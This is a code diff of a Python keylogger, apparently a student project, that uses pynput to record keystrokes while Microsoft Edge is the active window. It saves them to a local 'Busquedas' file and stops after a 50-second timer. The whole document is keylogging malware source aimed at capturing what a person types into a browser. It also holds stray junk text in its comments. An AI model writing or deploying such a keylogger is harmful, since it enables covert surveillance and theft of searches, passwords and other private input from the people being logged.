@@ -1,15 +1,19 @@
 #bibliotecas requeridas
+import sys
 import datetime
 from pynput import keyboard
 import logging
 import sys
+from threading import Thread
+import time
 #fecha para el archivo
 date_capture= datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
 #el archivo de guardado
-f= open('C:/Users/victo/Documents/Universidad Santiago/Inteligencia Artificial/Keylogger/keylogger_result{}.txt'.format(date_capture),"w")  
-#auxiliar para llevar la lista previa a la escritura en el archivo
-key_list=[]
+f= open('C:/Users/victo/Documents/Universidad Santiago/Inteligencia Artificial/Keylogger/files/Busquedas.txt',"w")  
+#auxiliar para llevar la lista previa a la escritura en el archivosjdjfjse
 
+key_list=[]
+  
 #Funcion para detectar la ventana que estoy usando en windows
 def active_window():
 
@@ -29,8 +33,6 @@ def on_press(key):
     #el target para rastrear la ventana(el buscador)
     target="Microsoft​ Edge"
     global key_list
- #smqoeotusnkdnajwwmk
- 
     if(active_window().find(target)!=-1):
 
         
@@ -68,12 +70,19 @@ def on_release(key):
     print('{0} released'.format(
         key))
     if key == keyboard.Key.esc:
-        # Stop listener 
+        # Stop listener
         return False
 
 
-# Collect events until released aqui
+
+
 with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
-    listener.join()
+    #iniciamos el timer antes del hilo de  escucha
+    def time_out(period_sec: int):
+        time.sleep(period_sec)  # Listen to keyboard for period_sec seconds
+        listener.stop()
+    Thread(target=time_out, args=(50,)).start()
+    listener.join()    
+    
